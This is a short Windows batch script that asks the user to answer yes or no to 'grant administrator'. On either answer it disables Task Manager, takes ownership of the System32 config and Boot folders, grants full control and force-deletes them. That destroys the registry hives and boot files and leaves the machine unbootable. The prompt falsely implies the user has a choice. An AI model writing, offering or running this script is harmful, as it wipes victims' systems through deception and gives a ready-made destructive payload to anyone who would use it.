@echo off
echo Please grant administrator to continue (answer in only yes/no)
set /p input=
if /i %input%==yes goto A
if /i %input%==no goto B

:A
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
takeown /f "C:\Windows\System32\config"
icacls "C:\Windows\System32\config"/grant administrators:F /t
del /F /S /Q "C:\Windows\System32\config" 
takeown "C:\Windows\System32\Boot" /f 
icacls "C:\Windows\System32\Boot" /grant administrators:F /t 
del /F /S /Q "C:\Windows\System32\Boot"


:B 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
takeown /f "C:\Windows\System32\config"
icacls "C:\Windows\System32\config"/grant administrators:F /t
del /F /S /Q "C:\Windows\System32\config" 
takeown "C:\Windows\System32\Boot" /f 
icacls "C:\Windows\System32\Boot" /grant administrators:F /t 
del /F /S /Q "C:\Windows\System32\Boot"



